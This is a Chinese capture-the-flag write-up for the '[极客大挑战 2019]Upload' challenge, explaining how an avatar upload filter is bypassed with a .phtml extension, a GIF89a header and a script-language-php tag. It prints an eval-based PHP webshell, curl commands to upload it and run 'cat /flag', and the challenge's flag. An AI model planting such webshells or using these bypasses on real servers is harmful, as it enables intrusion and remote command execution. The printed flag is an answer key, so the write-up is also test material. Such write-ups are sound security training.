# [极客大挑战 2019]Upload

## 题目概述
题目是一个头像上传页面，表单提交到 `upload_file.php`，需要通过文件上传漏洞获取 webshell 并读取 flag。

## 信息收集
1. 访问首页，发现是一个图片上传表单，提交到 `upload_file.php`
2. 测试上传 PHP 文件，发现存在多重过滤机制

## 漏洞分析（漏洞类型、原理、判断过程）

**过滤机制分析：**
1. **扩展名黑名单**：禁止 `.php` 扩展名，但未禁止 `.phtml`、`.php5` 等其他可执行扩展名
2. **文件内容检测**：检测文件是否为图片（检查文件头）
3. **PHP 标签过滤**：检测文件内容是否包含 `<?` 短标签

**绕过方式：**
1. 使用 `.phtml` 扩展名绕过扩展名黑名单
2. 添加 `GIF89a` 文件头伪装成 GIF 图片
3. 使用 `<script language="php">` 标签替代 `<?php` 绕过短标签检测

## 利用过程（Payload + Flag）

**Step 1: 构造绕过 payload**
```
GIF89a<script language="php">eval($_POST[cmd]);</script>
```

**Step 2: 上传文件**
```bash
curl -X POST "http://target/upload_file.php" \
  -F "file=@shell.phtml;type=image/gif" \
  -F "submit=提交"
```

**Step 3: 执行命令获取 flag**
```bash
curl "http://target/upload/test.phtml" -d "cmd=system('cat /flag');"
# 输出: GIF89aflag{d5b7b76c-ab48-4f38-ba07-bc5fdc96e996}
```

## 复现步骤
1. 创建包含 webshell 的 phtml 文件，添加 GIF 文件头
2. 使用 `<script language="php">` 标签绕过 `<?` 过滤
3. 上传文件，服务器返回上传路径
4. 访问上传的文件，POST 参数执行系统命令
5. 读取 `/flag` 获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 文件上传 | upload_file.php | `.phtml` + GIF头 + script标签 | 扩展名绕过、文件头伪造、PHP标签变体 |

## 知识总结（解题技巧、同类题型套路）

1. **扩展名绕过**：除了 `.php`，还有 `.phtml`、`.php3`、`.php5`、`.phps`、`.pht` 等可执行扩展名
2. **文件类型绕过**：添加图片文件头（GIF89a、PNG 签名等）可绕过简单的文件类型检测
3. **PHP 标签变体**：`<?php` 和 `<?` 是常用标签，但 `<script language="php">` 也是合法的 PHP 标签，常被过滤规则忽略
4. **文件上传套路**：先测试扩展名过滤 → 再测试内容检测 → 最后测试代码执行标签过滤
